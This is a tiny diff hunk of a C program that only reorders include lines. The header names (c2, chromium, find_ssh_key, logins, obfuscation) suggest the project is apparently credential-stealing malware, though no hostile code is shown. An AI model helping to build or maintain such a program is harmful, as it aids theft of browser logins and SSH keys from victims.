@@ -9,8 +9,8 @@
 #include "c2.h"
 #include "chromium.h"
 #include "find_ssh_key.h"
-#include "logins.h"
 #include "hardware_requirements.h"
+#include "logins.h"
 #include "obfuscation.h"
 
 int main(void) {
